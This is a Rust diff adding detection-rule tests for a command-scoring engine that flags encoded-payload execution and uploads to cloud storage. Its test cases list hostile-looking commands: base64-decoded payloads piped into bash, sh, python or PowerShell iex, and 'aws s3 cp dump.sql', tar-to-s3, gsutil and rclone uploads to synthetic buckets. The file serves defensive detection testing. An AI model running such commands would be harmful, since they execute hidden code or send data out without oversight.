@@ -518,3 +518,85 @@ fn private_key_read_excludes_public_key_suffix() {
         &["id_rsa.pub", "id_ed25519.pub"],
     );
 }
+
+#[test]
+fn encoded_payload_requires_an_observable_execution_step() {
+    assert_matches(
+        "execution.encoded_payload",
+        "command",
+        &[
+            "echo U1lOVEhFVElD | base64 --decode | bash",
+            "base64 -d payload.b64 | sh -s -- --flag",
+            "base64 -d payload.b64 | gunzip | sudo /bin/bash",
+            "cat payload.b64 | base64 -d | python3 -",
+            "eval \"$(echo U1lOVEhFVElD | base64 -d)\"",
+            "bash -c \"$(base64 --decode payload.b64)\"",
+            "bash <(base64 -d payload.b64)",
+            "source <(base64 -d payload.b64)",
+            "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)))",
+            "base64 -d payload.b64 > /tmp/run.sh && bash /tmp/run.sh",
+            "base64 -d payload.b64 > tool; chmod +x tool; ./tool",
+        ],
+        &[
+            "base64 --decode documented-fixture.b64",
+            "base64 -d fixture.b64 > fixture.bin",
+            "echo eyJhIjoxfQ== | base64 -d | python3 -m json.tool",
+            "echo eyJhIjoxfQ== | base64 -d | jq .",
+            "base64 -d key.b64 > id_fixture && chmod 600 id_fixture",
+            "echo $KEYSTORE | base64 -d > release.jks && ./gradlew assembleRelease",
+            "[IO.File]::WriteAllBytes('a.bin', [Convert]::FromBase64String($s))",
+            "certutil -decode cert.b64 cert.cer",
+        ],
+    );
+}
+
+#[test]
+fn decoding_without_execution_is_a_zero_point_hunt_signal() {
+    let rules = bundled();
+    let result = rules
+        .evaluate(&[("command", "base64 --decode documented-fixture.b64")])
+        .expect("evaluate")
+        .expect("match");
+    assert_eq!(result.rule_ids, ["obfuscation.decode"]);
+    assert_eq!(result.score, 0);
+    assert_eq!(
+        rule_ids(
+            &rules,
+            "command",
+            "echo U1lOVEhFVElD | base64 --decode | bash"
+        ),
+        [
+            "execution.shell",
+            "execution.encoded_payload",
+            "chain.shell_encoded_payload"
+        ]
+    );
+}
+
+#[test]
+fn object_storage_copy_counts_only_local_to_remote_uploads() {
+    assert_matches(
+        "exfil.outbound_upload",
+        "command",
+        &[
+            "aws s3 cp dump.sql s3://synthetic-bucket/",
+            "aws s3 cp --recursive ./dist s3://synthetic-bucket/site/ --acl private",
+            "tar czf - . | aws s3 cp - s3://synthetic-bucket/repo.tgz",
+            "gsutil cp build.tar gs://synthetic-bucket/",
+            "rclone copy ./reports synthetic-remote:archive",
+            "az storage blob upload --container-name c --name n --file dump.sql",
+            "az storage blob upload-batch --destination c --source ./dist",
+        ],
+        &[
+            "aws s3 cp s3://synthetic-bucket/a ./a",
+            "aws s3 cp s3://synthetic-bucket/a -",
+            "gsutil cp gs://synthetic-bucket/a.tar .",
+            "rclone copy synthetic-remote:archive ./reports",
+            "aws s3 cp s3://synthetic-bucket/a s3://other-bucket/a",
+            "aws s3 cp --profile fixture dump.sql s3://synthetic-bucket/",
+            "az storage account list",
+            "az storage container list --account-name acct",
+            "az storage blob download --container-name c --name n --file dump.sql",
+        ],
+    );
+}
